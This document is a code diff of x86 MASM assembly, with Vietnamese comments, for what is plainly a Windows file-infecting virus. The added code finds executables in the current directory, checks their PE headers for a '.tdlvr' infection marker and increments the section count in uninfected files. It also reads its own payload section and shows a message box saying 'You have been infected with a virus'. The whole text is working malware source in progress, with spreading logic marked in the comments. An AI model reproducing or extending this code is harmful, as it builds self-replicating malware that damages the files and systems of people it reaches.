@@ -3,6 +3,7 @@
 .stack 100h
 option casemap:none
 .code
+payload:
 WIN32_FIND_DATAA STRUC
     dwFileAttributes     dd ?
     ftCreationTimeLow    dd ?
@@ -52,6 +53,27 @@ read proc
 	ret
 
 read endp
+
+readNow proc 
+
+	mov edx , offset data
+	add edx , ebp	
+	push 100
+	push edx 
+	call dword ptr [ebp + offset handleRtlZeroMemory]
+	
+	mov edx , offset data
+	add edx , ebp
+	
+	push 0
+	push 0
+	push dword ptr [ebp + offset number]
+	push edx
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleReadFile]
+	ret
+
+readNow endp
 main: ;main----
 	call Delta
 Delta:
@@ -132,8 +154,28 @@ endFindAddress:
 	push esi
 	call eax
 	mov dword ptr [ebp + offset handleLoadLibrary] , eax
-	;gio da co 2 handle cua ham quan trong nhat gio chi can duyet file cac kieu thoi nhi
 	mov dword ptr [ebp + offset handleKernel32] , esi
+	;gio da co 2 handle cua ham quan trong nhat gio chi can duyet file cac kieu thoi nhi
+	;; day la phan tan cong attack
+	;MessageBox
+	mov edx , offset user32
+	add edx , ebp
+	push edx
+	call handleLoadLibrary
+	mov dword ptr [ebp + offset handleUser32] , eax
+	
+	mov edx , offset MessageBoxAName
+	add edx , ebp 
+	push edx 
+	push dword ptr [ebp + offset handleUser32]
+	call dword ptr [handleGetProcAddress]
+	
+	mov dword ptr [ebp + offset handleMessageBoxA] , eax
+	
+	mov dword ptr [ebp + offset offsetString] , offset notificationMalware
+	call print
+	;-------------------------------------------------
+	;;end tan cong attack
 	
 	mov edx , offset GetCurrentDirectoryName
 	add edx , ebp
@@ -182,21 +224,6 @@ nextLoopPath:
 	call dword ptr [ebp + offset handleGetProcAddress]
 	mov dword ptr [ebp + offset handleFindNextFileA] , eax
 	;-------------------------------
-	;MessageBox
-	mov edx , offset user32
-	add edx , ebp
-	push edx
-	call handleLoadLibrary
-	mov dword ptr [ebp + offset handleUser32] , eax
-	
-	mov edx , offset MessageBoxAName
-	add edx , ebp 
-	push edx 
-	push dword ptr [ebp + offset handleUser32]
-	call dword ptr [handleGetProcAddress]
-	
-	mov dword ptr [ebp + offset handleMessageBoxA] , eax
-	;-------------------------------------------------
 	;; loop tung file
 loopFileok:
 	mov edx , offset wfd
@@ -303,6 +330,8 @@ endloopGetNewName2:
 	
 	mov dword ptr [ebp +offset number] , 4
 	call read
+	mov eax ,dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset ifanew] , eax 
 	push 0
 	push 0
 	push dword ptr [ebp + offset data]
@@ -327,14 +356,201 @@ endloopGetNewName2:
 	cmp word ptr [ebp +offset data] , 010Bh
 	jne loopFileok
 	;-------------------------------------------
-	mov dword ptr [ebp + offset offsetString] , offset pathNew
-	call print
-	;mov dword ptr [ebp + offset offsetString] , offset data
-	;call print 
+	push 0
+	push 0
+	push dword ptr [ebp + offset ifanew]
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	
+	push 1
+	push 0
+	push 248
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 8
+	call read
+	
+	mov ecx , 0
+loopSoSanh:
+	cmp byte ptr [ebp + offset nameSectionPayload + ecx] , 0
+	je loopFileok
+	mov al , byte ptr [ebp + offset nameSectionPayload + ecx]
+	cmp byte ptr [ebp + offset data + ecx] , al
+	jne nextSection
+	inc ecx
+	jmp loopSoSanh
+nextSection:
+	push 1
+	push 0
+	push 32
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 8
+	call read
+	cmp dword ptr [ebp + offset data] , 0
+	je notInfected
+	mov ecx , 0
+	jmp loopSoSanh
+notInfected	:
+	;;bat dau lay lan
+	push 0 
+	push 0
+	push dword ptr [ebp + offset ifanew]
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	push 1
+	push 0
+	push 6
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call read
+	
+	mov eax , dword ptr [ebp + offset data]
+	inc eax
+	mov dword ptr [ebp + offset data] , eax
+	push 1
+	push 0
+	push -4
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov eax , offset data
+	add eax , ebp
+	push 0
+	push 0
+	push 4
+	push eax
+	push dword ptr [ebp + offset handleFile]
+	call dword ptr [ebp + offset handleWriteFile]
+	;
+	
+	;--------------------------------
+	mov edx , offset GetModuleFileNameAName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleGetModuleFileNameA] , eax
+	
+	mov edx , offset CloseHandleName
+	add edx , ebp
+	push edx 
+	push dword ptr [ebp + offset handleKernel32]
+	call dword ptr [ebp + offset handleGetProcAddress]
+	mov dword ptr [ebp + offset handleCloseHandle] , eax
+	
+	mov edx , offset pathNow
+	add edx , ebp
+	push 100
+	push edx 
+	push 0
+	call dword ptr [ebp + offset handleGetModuleFileNameA]
+	
+	mov edx , offset pathNow
+	add edx , ebp
+	push 0
+	push 128
+	push 3
+	push 0
+	push 0
+	push 80000000h
+	push edx
+	call dword ptr [ebp + offset handleCreateFile]
+	mov dword ptr [ebp + offset handleFileNow] , eax
+	
+	
+	
+	mov edx , offset data
+	add edx , ebp	
+	push 100
+	push edx 
+	call dword ptr [ebp + offset handleRtlZeroMemory]
+	
+	
+	push 0
+	push 0
+	push 60
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	mov dword ptr [ebp + offset number] , 4
+	call readNow
+	
+	push 0
+	push 0
+	push dword ptr [ebp + offset data]
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	
+	push 1
+	push 0
+	push 248
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+loopFindPayload:	
+	push 1
+	push 0
+	push 36
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	mov dword ptr [ebp + offset number] , 4
+	call readNow
+	cmp dword ptr [data] , 0E0000020h
+	jne loopFindPayload
+	;;;
+	push 1
+	push 0
+	push -32
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	mov dword ptr [ebp + offset number] , 4
+	call readNow
+	mov edx , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset virtualSize] , edx
+
+	
+	
+	push 1
+	push 0
+	push 4
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleSetFilePointer]
+	mov dword ptr [ebp + offset number] , 4
+	call readNow
+	mov edx , dword ptr [ebp + offset data]
+	mov dword ptr [ebp + offset rawSize] , edx
+	
+	
+	
+	mov edx , ebp
+	add edx , offset payload
+	mov eax , dword ptr [edx]
+	;mov edx , dword ptr [ebp + offset virtualSize]
+	;add edx , ebp
+	;sub edx , 8
+	;close hanfle
+	push dword ptr [ebp + offset handleFileNow]
+	call dword ptr [ebp + offset handleCloseHandle]
 	;;
 	jmp loopFileok
+	;;end
 endMain:
 ;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+virtualSize dd ?
+rawSize dd ?
+CloseHandleName db "CloseHandle" , 0
+handleCloseHandle dd ?
+handleFileNow dd ?
+pathNow db 100 dup (0)
+GetModuleFileNameAName db "GetModuleFileNameA" , 0
+handleGetModuleFileNameA dd ?
+nameSectionPayload db ".tdlvr" ,0 
 SetFilePointerName db "SetFilePointer" , 0
 handleSetFilePointer dd ?
 WriteFileName db "WriteFile" , 0
@@ -376,8 +592,8 @@ flagCheckExe db 0
 virtualAddress dd ?
 ifanew dd ?
 sectionNumber dw ?
-notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
 wfd WIN32_FIND_DATAA <>
 offsetString dd ?
 number dd ?
+notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
 end main
